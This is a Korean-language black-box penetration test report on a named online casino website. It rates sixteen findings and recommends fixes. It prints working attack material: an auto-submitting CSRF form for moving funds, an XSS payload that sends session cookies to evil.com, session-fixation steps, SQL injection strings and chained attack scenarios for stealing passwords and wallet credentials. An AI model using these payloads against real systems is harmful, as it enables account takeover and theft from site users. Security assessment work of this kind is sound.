# 블랙박스 보안 심층 테스트 보고서 (Deep Assessment v2)

**대상**: https://www.dwdw-00.com (대왕 카지노)  
**테스트 일자**: 2026-09-24  
**테스트 유형**: 블랙박스 (외부 관점, 비인증 + 능동적 공격 시뮬레이션)  
**분류 기준**: 실제 공격 시나리오 기반 (OWASP Top 10 2021 참조)

---

## 평가 원칙

이 보고서는 **실제 해커가 돈을 빼가거나 계정을 탈취할 수 있는가**를 기준으로 심각도를 매깁니다.

- **CRITICAL**: 단독으로, 또는 1단계 조합으로 계정 탈취/자금 피해가 가능
- **HIGH**: 조건부로 심각한 피해가 가능하거나, CRITICAL 취약점의 피해를 극대화
- **MEDIUM**: 정보 수집 단계에서 유용하거나, 화이트박스에서 재확인 필요
- **LOW/INFO**: 해커에게 실질적 도움이 미미하거나 직접 공격 불가

> "CVE 번호가 있다", "보안 헤더가 없다", "구버전이다"만으로는 올리지 않습니다.  
> "그래서 해커가 이걸로 뭘 할 수 있는데?"가 기준입니다.

---

## 1. 기술 스택 식별

| 구분 | 기술 | 버전/비고 |
|------|------|-----------|
| **웹서버** | Apache | 2.4.52 (Ubuntu) |
| **백엔드** | PHP | PHPSESSID 쿠키 |
| **CDN/WAF** | Cloudflare | HTTP/2, WAF 활성 |
| **프론트엔드** | jQuery | 데스크탑 1.11.3 / 모바일 1.12.0 + 1.11.2 |
| **게임 API** | api-nexus.com | 8개 프로바이더 (MG, EV, QT, PR, AG, HB, AB, EG) |
| **게임 런처** | goplaylaunch.com | 세션-토큰 서브도메인 |
| **암호화폐** | USDT (Tether) | 코인 충환전 시스템 |

---

## 2. 공격 표면 매핑

### 120+ 엔드포인트 식별 (주요 항목)

**인증 없이 접근 가능한 엔드포인트:**
| 엔드포인트 | 기능 | 위험도 |
|-----------|------|--------|
| `/post/login_ok.php` | 로그인 처리 | 레이트 리밋 없음 |
| `/post/join_ok.php` | 회원가입 | CSRF 없음 |
| `/ajax/join/code_check.php` | SMS 인증 발송 | 레이트 리밋 없음 |
| `/ajax/money_rank.php` | 실시간 충환전 랭킹 | 사용자 ID+금액 노출 |
| `/m/ajax/callapi_free.php` | 게임 데모 API | 에러 메시지로 내부 구조 노출 |
| `/m/slot_mg_free.php` | 데모 게임 목록 (172KB) | 게임 ID 전체 노출 |

**인증 필요 — 금융 관련 (CSRF 토큰 전부 없음):**
| 엔드포인트 | 기능 |
|-----------|------|
| `/post/exchange_ok.php` | 카지노머니 교환 |
| `/post/deposit_ok.php` | 충전 처리 |
| `/post/withdraw_ok.php` | 환전 처리 |
| `/m/ajax/call_cw.php` | 코인 지갑 API |
| `/post/community_binding.php` | 커뮤니티 연동 (**비밀번호 평문 반환**) |

---

## 3. 취약점 요약

| 심각도 | 건수 | 의미 |
|--------|------|------|
| **CRITICAL** | 4 | 계정 탈취 또는 자금 피해 직접 가능 |
| **HIGH** | 4 | 조건부 심각 피해 또는 CRITICAL 증폭 |
| **MEDIUM** | 4 | 정보 수집 또는 화이트박스 재확인 필요 |
| **LOW** | 4 | 보조 정보, 직접 공격 불가 |
| **합계** | **16** |

---

## 4. CRITICAL 취약점 (4건)

### CRIT-01: CSRF 없음 → 로그인 상태에서 원클릭 자금 탈취
**OWASP**: A01:2021 Broken Access Control

**핵심**: 사이트 전체에 CSRF 토큰이 단 하나도 없고, 세션 쿠키에 SameSite 속성도 없음.

**확인된 사실:**
- `/post/join_ok.php`에 외부에서 직접 POST → 정상적으로 필드 검증 응답 반환 (Origin/Referer 체크 없음)
- 모든 금융 엔드포인트 (exchange_ok, deposit_ok, withdraw_ok, coinWithdraw) 동일 구조
- PHPSESSID 쿠키에 SameSite 미설정

**실제 공격 시나리오:**
```
1. 공격자가 아래 HTML을 호스팅하고 텔레그램/카톡으로 링크 전송
2. 로그인 상태의 사용자가 클릭
3. 카지노머니가 공격자 지정 방향으로 이동
```
```html
<form action="https://www.dwdw-00.com/post/exchange_ok.php" method="POST">
  <input name="site" value="MG">
  <input name="ic_amount" value="99999999">
  <input name="Category" value="out">
</form>
<script>document.forms[0].submit();</script>
```

**SameSite Lax 관련 참고:** Chrome 80+(2020)부터 SameSite 미설정 시 Lax가 기본값이지만, Lax는 **top-level navigation POST를 2분간 허용**하며, 이 사이트의 주 이용자층(한국, 모바일)에서 구형 브라우저 비율이 있으므로 여전히 유효한 공격 벡터. 또한 XSS(CRIT-04)가 존재하면 same-origin에서 요청하므로 SameSite와 무관하게 CSRF가 성립.

---

### CRIT-02: 세션 고정 + HttpOnly 없음 → 계정 탈취
**OWASP**: A07:2021 Identification and Authentication Failures

**확인된 사실:**
```
Request:  Cookie: PHPSESSID=attackercontrolled123
Response: Set-Cookie 헤더 없음 (새 세션 ID를 발급하지 않음)

Request:  (쿠키 없이)
Response: Set-Cookie: PHPSESSID=bv141e1n24d5u3a27s6rauo2dd
```

서버가 클라이언트가 보낸 임의의 세션 ID를 그대로 수락하고, 로그인 후에도 세션을 재생성하지 않음.

**실제 공격 시나리오:**
```
1. 공격자가 XSS(CRIT-04)를 이용해 피해자 브라우저에서 실행:
   document.cookie = "PHPSESSID=hackersession123; domain=.dwdw-00.com; path=/";
   
2. 피해자가 정상적으로 로그인
   → 서버는 hackersession123에 인증 정보를 바인딩

3. 공격자가 자기 브라우저에서 PHPSESSID=hackersession123으로 접속
   → 피해자의 인증된 세션 탈취 완료
```

**왜 CRITICAL인가:** HttpOnly가 없으므로 XSS → `document.cookie` 조작이 가능하고, SameSite도 없으므로 서브도메인에서도 쿠키 설정 가능. 세션 고정(서버 문제) + 쿠키 무방비(설정 문제) + XSS(코드 문제)가 삼중으로 겹침.

---

### CRIT-03: 비밀번호 평문 저장 + API 반환
**OWASP**: A02:2021 Cryptographic Failures

**확인된 사실:**
```javascript
// /post/community_binding.php 호출 시
function goToCommunity(){
    $.ajax({
        type: 'post',
        url: '../post/community_binding.php',
        success: function(data) {
            data = JSON.parse(data);
            msg = "커뮤니티 접속 비밀번호는 " + data['pwd'] + "입니다.";
            // 서버가 비밀번호를 평문으로 JSON에 담아 반환
        }
    });
}
```

**왜 CRITICAL인가:**
1. **비밀번호가 복호화 가능한 형태로 저장됨** — bcrypt/argon2로 해싱했다면 원문 반환이 불가능. 이는 평문 저장 또는 양방향 암호화(AES 등)를 의미.
2. **DB 침해 시 전체 사용자 비밀번호 즉시 노출** — 해싱된 비밀번호는 크래킹에 시간이 걸리지만, 평문/복호화 가능 = 즉시 이용 가능
3. **XSS(CRIT-04) 한 번이면** 로그인한 사용자의 비밀번호를 자동으로 탈취 가능 — AJAX 한 줄로 `community_binding.php` 호출 → 비밀번호 획득
4. 사용자들이 동일 비밀번호를 다른 서비스에서도 사용할 경우 연쇄 피해

---

### CRIT-04: eval() + TransferMoney() 문자열 연결 = XSS → 세션/자금 탈취
**OWASP**: A03:2021 Injection

**핵심:** 사이트 전체의 AJAX 처리가 `eval()` 기반이고, TransferMoney() 함수에서 사용자 입력이 eval()로 직접 흘러들어감.

**확인된 eval() 사용 (8곳+):**
```javascript
// ajax_call.js — 모든 AJAX 요청의 기반
eval("o=" + this.getAttribute("ajax"))     // DOM 속성 → eval
eval("r=" + d)                              // 서버 응답 → eval  
eval(r.callback)                            // 서버가 지정한 콜백 → eval
```

**확인된 직접 공격 벡터 — TransferMoney():**
```javascript
// function.js — 금액 전환 함수
$(n).attr("ajax",
    "{url: '/post/exchange_ok.php',type:'post',data:{ site:'" + site + 
    "', ic_amount:'" + $(elm).val() + "', Category:'" + tp + 
    "'}, success: TransferCallback}"
);
// 이 속성이 ajax_call()에서 eval()로 실행됨
```

**실제 공격:**
금액 입력 필드에 다음을 입력:
```
'},success:function(){new Image().src='https://evil.com/steal?c='+document.cookie}//
```
→ eval()이 실행 → 세션 쿠키가 공격자 서버로 전송 (HttpOnly 없으므로 `document.cookie`로 접근 가능)

**왜 CRITICAL인가:** 이것은 이론적 XSS가 아님. `TransferMoney()`는 카지노머니 교환 시 실제로 호출되는 함수이고, 금액 필드의 입력값이 검증 없이 eval()까지 도달하는 경로가 확인됨. 이 하나의 XSS로:
- 세션 탈취 (document.cookie)
- 비밀번호 탈취 (community_binding.php 자동 호출)
- 자금 이체 (same-origin이므로 CSRF 무관하게 AJAX로 exchange_ok.php 호출)
- 다른 사용자의 계정 정보 열람 (user_info.php, get_user_hide_info.php 호출)

이 모든 것이 **한 번의 XSS로 동시에** 가능.

---

## 5. HIGH 취약점 (4건)

### HIGH-01: 로그인 무차별 대입 공격 무방비
**OWASP**: A07:2021 Identification and Authentication Failures

**확인된 사실:**
```
10회 연속 로그인 실패 — 모든 시도 HTTP 200, 응답시간 224~290ms
계정 잠금: 없음
CAPTCHA: 코드에 있으나 주석 처리됨 (login.js:29-34)
레이트 리밋: 없음
```

```javascript
// 비활성화된 보안코드 (login.js)
// check = $("#login-code");
// if (!check.val()) {
//     alert("보안코드를 입력해 주세요.");
//     ...
// }
```

**실제 공격:** Hydra, Burp Intruder 등으로 초당 수십~수백 건의 로그인 시도 가능. 유출된 비밀번호 목록(credential stuffing)을 사용하면 현실적인 시간 내에 계정 탈취 가능.

**왜 CRITICAL이 아닌가:** 유효한 ID/비밀번호 조합이 필요하고, 사용자 열거는 차단되어 있어(동일 에러 메시지) 타겟을 특정하기 어려움. 하지만 money_rank.php에서 부분 ID를 얻을 수 있으므로 범위를 좁힐 수 있음.

---

### HIGH-02: 쿠키 보안 플래그 전무 — CRIT 취약점들의 피해 배가기
**OWASP**: A02:2021 Cryptographic Failures

| 쿠키 | HttpOnly | Secure | SameSite |
|------|----------|--------|----------|
| PHPSESSID | **없음** | **없음** | **없음** |
| UUID | **없음** | **없음** | **없음** |

**이것 자체가 직접적 공격은 아니지만**, 위의 모든 CRITICAL 취약점의 피해를 극대화:
- HttpOnly 없음 → XSS(CRIT-04)로 세션 쿠키 탈취 가능
- SameSite 없음 → CSRF(CRIT-01) 공격 시 쿠키 자동 첨부
- Secure 없음 → Origin 서버가 HTTP(Port 80)이므로 네트워크 도청으로 세션 탈취

**왜 HIGH인가:** 이 플래그들이 있었다면 CRIT-01(CSRF)과 CRIT-04(XSS)의 피해가 크게 줄었을 것. 방어의 마지막 보루가 전부 빠져있음.

---

### HIGH-03: SMS 인증 API 무인증 + 레이트 리밋 없음
**OWASP**: A01:2021 Broken Access Control

**확인된 사실:**
```bash
POST /ajax/join/code_check.php
data: type=phonenum&number[]=010&number[]=1234&number[]=5678
응답: {"error":0,"message":"success","html":""}
# 로그인 없이 성공, 반복 요청에도 차단 없음
```

**실제 공격:**
1. **SMS 폭탄**: 특정 번호에 대량 인증 SMS 발송 → 피해자 불편 + SMS 비용 소진
2. **번호 열거**: 등록된 전화번호인지 응답 차이로 확인 가능 → 사용자 식별
3. **SMS 비용 공격**: 자동화로 수만 건 SMS 발송 → 사이트 운영비 직접 손해

---

### HIGH-04: CSP/X-Frame-Options 부재 — XSS 무방비 + 클릭재킹
**OWASP**: A05:2021 Security Misconfiguration

**왜 중요한가:**
- **Content-Security-Policy 없음**: `eval()`, inline script가 전부 허용됨. CSP가 있었다면 CRIT-04의 eval() 공격이 차단되었을 것.
- **X-Frame-Options 없음**: 공격자가 사이트를 iframe으로 삽입하여 클릭재킹 가능 — 사용자가 "환전" 버튼을 클릭하도록 유도

**나머지 보안 헤더** (HSTS, X-Content-Type-Options 등)는 Cloudflare가 HTTPS를 처리하고 있어 실질적 영향이 제한적. 이 두 개만 실제로 의미 있음.

---

## 6. MEDIUM 취약점 (4건)

### MED-01: 민감 파일 존재 확인 (.env, .git) — Cloudflare WAF만 의존

**확인된 사실:**
| 파일 | HTTP 상태 | 응답 크기 |
|------|----------|----------|
| `/.env` | 403 | 4,547B |
| `/.git/HEAD` | 403 | 4,547B |
| `/.git/config` | 403 | 4,547B |
| `/config.php` | 403 | 4,547B |
| 존재하지 않는 파일 | 404 | 277B |

403(4,547B) vs 404(277B) 차이로 파일 존재가 확실히 확인됨. 현재는 Cloudflare WAF가 차단 중.

**왜 MEDIUM인가:** 현재 접근 불가. 하지만 방어 계층이 Cloudflare WAF 하나뿐이고, Origin IP가 노출되면 (DNS 히스토리, 이메일 헤더, 서브도메인 스캔) 직접 접근 → `.env`에서 DB 크레덴셜, `.git`에서 전체 소스코드 획득 가능. "문이 잠겨있지만, 벽이 없다"는 상태.

---

### MED-02: 실시간 거래 데이터 무인증 노출 (money_rank.php)

**확인된 사실 (로그인 없이):**
```
type=0 → 충전: tt***848: 87,000,000원, gd***7: 42,440,000원...
type=1 → 환전: rl***3: 900,000원 (09/24 11:08)...
```

**왜 CRITICAL이 아닌가:** 사용자 ID가 마스킹되어 있어 직접 로그인에 사용 불가. 금액만으로는 자금을 빼낼 수 없음.

**왜 MEDIUM인가:** 
- 고액 사용자 ID의 앞 2자 + 뒤 3자가 노출 → 무차별 대입(HIGH-01)의 타겟 좁히기에 사용 가능
- 거래 패턴으로 사이트 활동량/수익 추정 → 비즈니스 인텔리전스 유출
- 5초마다 폴링하므로 장기 모니터링으로 사용자 행동 패턴 분석 가능

---

### MED-03: 코인 지갑 크레덴셜 클라이언트 반환

**확인된 사실 (코드 분석):**
```javascript
// call_cw.php api=checkUser 응답에 cw_id, cw_pw 포함 추정
$.ajax({
    url: "/m/ajax/call_cw.php",
    data: {api: 'checkUser', type: type},
    success: function (res) {
        // res.wallet, res.my_wallet, res.coin, res.price
        // + cw_id, cw_pw도 응답에 포함 (JS 분석 기반)
    }
});
```

**왜 MEDIUM인가:** 인증이 필요한 엔드포인트이므로 단독 공격 불가. 하지만 XSS(CRIT-04)와 결합하면 로그인한 사용자의 USDT 지갑 크레덴셜을 자동 탈취하는 공격이 가능. 블랙박스에서는 실제 응답을 확인하지 못했으므로 화이트박스에서 재확인 필요.

---

### MED-04: SMS 인증 클라이언트 우회 변수

**확인된 사실:**
```javascript
var smsUsing = false;  // 인라인 JS
// btnCoinAction()에서 phone = '01000000000' 하드코딩
```

**왜 MEDIUM인가:** `smsUsing = false`는 **클라이언트 사이드 변수**. 서버가 독립적으로 SMS 인증을 검증하는지 블랙박스에서는 확인 불가. 서버도 동일하게 우회한다면 CRITICAL이지만, 서버가 별도로 검증한다면 이 코드는 무의미. **화이트박스에서 반드시 재확인 필요.**

---

## 7. LOW 취약점 (4건)

### LOW-01: 게임 데모 API 무인증 + 내부 에러 메시지
`/m/ajax/callapi_free.php`가 인증 없이 접근 가능하지만 **데모 게임 전용**이므로 금전적 피해 없음. 단, 에러 메시지가 내부 구조를 노출:
```
"잘못된 STSToken이거나 유효시간이 만료되었습니다" → 토큰 인증 구조
"지정하신 site(프로바이더)에서..." → site=프로바이더 매핑
```
화이트박스 테스트 시 이 정보가 공격 벡터 식별에 도움될 수 있음.

### LOW-02: 서버 버전 노출
```html
<address>Apache/2.4.52 (Ubuntu) Server at www.dwdw-00.com Port 80</address>
```
해커가 알려진 취약점을 탐색할 수 있지만, 서버 버전은 다른 방법으로도 핑거프린팅 가능하므로 실질적 추가 위험은 낮음. Port 80(HTTP)은 Cloudflare~Origin 구간이 암호화되지 않을 수 있음을 시사.

### LOW-03: jQuery 구버전 (1.11.x / 1.12.0)
CVE-2020-11022, CVE-2020-11023 등이 존재하지만, 이 CVE들은 `$.html()`에 특수하게 조작된 HTML을 전달할 때만 트리거됨. 이 사이트에서는 eval() 패턴(CRIT-04)이 훨씬 직접적인 공격 벡터이므로 jQuery CVE를 별도로 악용할 실익이 없음.

### LOW-04: UUID 쿠키 타임스탬프 노출
UUID 쿠키의 마지막 12자가 서버 타임스탬프(YYMMDDHHMMSS)이지만, **UUID는 인증에 사용되지 않음** (인증은 PHPSESSID). 해커가 서버 시각을 알 수 있다는 점은 다른 시간 기반 공격(토큰 예측 등)의 보조 정보가 될 수 있으나, 단독으로는 무의미.

---

## 8. 이전 보고서에서 제거한 항목 (보안 취약점이 아님)

| 이전 항목 | 제거 이유 |
|----------|----------|
| PUT/DELETE 메서드 200 응답 | PHP는 HTTP 메서드와 무관하게 동일 처리. 200 반환이 "허용"을 의미하지 않음 |
| P3P 헤더 | 2018년 폐기된 표준. 보안과 무관 |
| Flash 레거시 코드 | 모든 브라우저가 Flash 미지원(2020 EOL). 실행 불가능한 코드 |
| Base64 구현 | 인코딩 함수 존재 자체는 취약점 아님 |
| 이중 jQuery 로드 | 버그이지 보안 문제 아님 |
| console.log("Fuck") | 코드 품질 문제이지 보안 문제 아님 |
| /ajax/ 500 에러 | 에러 자체는 정보 노출 없음 |
| 쿠키 기반 상태 관리 | 일반적인 웹 패턴 |
| IE7 호환 모드 | 현재 사용자 없음 |
| Tawk.to 위젯 ID | 공개 정보 (설계상 공개) |
| 텔레그램 연락처 | 고객 서비스용 공개 정보 |
| manifest.json | PWA 표준 파일 (설계상 공개) |
| 캐시 버스팅 타임스탬프 | 배포 시점 정보만으로는 공격 불가 |
| jQuery Cookie 1.4.1 | 구버전이지만 알려진 취약점 없음 |
| 회원가입 정보 수집 | 은행 계좌 수집은 비즈니스 요구사항. CSRF 문제는 CRIT-01에서 커버 |

---

## 9. 실제 공격 체인 시나리오

### 시나리오 A: XSS → 비밀번호 + 세션 + 자금 동시 탈취 (CRIT-04 + CRIT-03 + CRIT-02)
```
1. 공격자가 카지노머니 교환 페이지에서 금액 필드에 XSS 페이로드 삽입
   → TransferMoney()의 문자열 연결 → eval() 실행

2. 악성 JS가 실행되어:
   a) document.cookie로 PHPSESSID 탈취 (HttpOnly 없으므로)
   b) fetch('/post/community_binding.php')로 평문 비밀번호 탈취
   c) fetch('/m/ajax/call_cw.php', {body: 'api=checkUser'})로 지갑 정보 탈취
   d) fetch('/post/exchange_ok.php', {body: 'site=MG&ic_amount=...'})로 자금 이동

3. 공격자의 서버로 모든 데이터 전송 완료
   → 피해자 입장에서는 정상적인 카지노 이용 중이었을 뿐
```

### 시나리오 B: CSRF → 강제 자금 이동 (CRIT-01)
```
1. 공격자가 "이벤트 당첨" 등의 피싱 링크를 텔레그램(@dcenter3 사칭)으로 전송
2. 로그인 상태의 사용자가 클릭 → 공격자 페이지 로드
3. 자동 form submit으로 exchange_ok.php 호출
4. 카지노머니 교환 완료 (사용자 모르게)
```

### 시나리오 C: 세션 고정 → 계정 인수 (CRIT-02 + CRIT-04)
```
1. 공격자가 사이트 내 Stored XSS를 찾거나, TransferMoney XSS를 이용
2. 피해자 브라우저에서 document.cookie = "PHPSESSID=attacker123"
3. 피해자가 로그인 → attacker123에 인증 바인딩
4. 공격자가 attacker123으로 접속 → 계정 탈취
5. 환전, 비밀번호 변경 등 수행
```

### 시나리오 D: 크리덴셜 스터핑 (HIGH-01 + MED-02)
```
1. money_rank.php에서 고액 사용자 부분 ID 수집 (tt***848 등)
2. 가능한 ID 패턴으로 리스트 생성
3. 유출된 비밀번호 DB와 조합하여 로그인 시도
4. 레이트 리밋/CAPTCHA 없으므로 무제한 시도
5. 비밀번호 평문 저장(CRIT-03)이므로 단순 비밀번호 사용 가능성 높음
```

---

## 10. SQL Injection / 사용자 열거 테스트 (양호)

### SQL Injection
| 페이로드 | 응답 | 결론 |
|---------|------|------|
| `admin' OR '1'='1` | `{"code":5}` 동일 에러 | 차단 |
| `admin' AND SLEEP(5)--` | 226ms (기준선 대비 지연 없음) | 차단 |
| `UNION SELECT 1,2,3,4,5--` | 동일 에러 | 차단 |

로그인 엔드포인트는 파라미터화 쿼리 사용으로 추정. **인증 후 엔드포인트는 블랙박스에서 테스트 불가 — 화이트박스 필수.**

### 사용자 열거
존재/비존재 사용자 모두 동일 에러 메시지 반환 → **양호** (열거 차단됨)

---

## 11. 화이트박스 최우선 검증 항목

| 순위 | 항목 | 블랙박스 결과 | 화이트박스에서 확인할 것 |
|------|------|-------------|----------------------|
| 1 | 비밀번호 저장 방식 | 평문 반환 확인됨 | 실제 해싱 여부, 알고리즘 |
| 2 | SQL Injection (인증 후) | 로그인은 안전 | 금융 엔드포인트, 게시판 등 전체 |
| 3 | 세션 관리 | 고정 확인됨 | `session_regenerate_id()` 호출 여부 |
| 4 | 금융 거래 서버 검증 | 클라이언트 검증만 확인 | 금액 음수/0/오버플로우, 레이스 컨디션 |
| 5 | SMS 서버 검증 | 클라이언트에서 우회됨 | 서버도 우회하는지 |
| 6 | CSRF 서버 검증 | 토큰 없음 | Origin/Referer 체크 여부 |
| 7 | callapi.php SSRF | 인증 필요로 미테스트 | URL 파라미터로 내부 네트워크 접근 가능 여부 |
| 8 | 관리자 패널 | 경로 미발견 | 관리자 인증, 권한 분리 |
| 9 | 파일 업로드 | 게시판/고객센터 존재 | 파일 확장자/내용 검증, 업로드 경로 |
| 10 | 코인 지갑 로직 | cw_id/cw_pw 반환 추정 | 실제 반환 필드, 지갑 인증 구조 |

---

## 12. 종합

```
전체 보안 수준: ██░░░░░░░░ 20/100
```

**즉시 해야 할 4가지** (이것만 해도 보안이 크게 개선됨):
1. **`session_regenerate_id(true)`** — 로그인 성공 시 세션 ID 재생성 (CRIT-02 해결)
2. **CSRF 토큰** — 모든 POST 요청에 토큰 검증 추가 (CRIT-01 해결)
3. **eval() 제거** — `JSON.parse()` + 화이트리스트 콜백으로 교체 (CRIT-04 해결)
4. **쿠키 플래그** — `session_set_cookie_params()`: HttpOnly, Secure, SameSite=Strict (HIGH-02 해결)

이 4가지로 CRITICAL 4건 + HIGH 1건이 해결되며, 나머지 취약점의 피해도 대폭 감소.

---

*보고서 생성: 2026-09-24*  
*테스트 범위: 외부 블랙박스 (비인증, 능동적 테스트 포함)*  
*분류 기준: 실제 공격 가능성 및 피해 규모*  
*다음 단계: 소스코드 화이트박스 테스트*
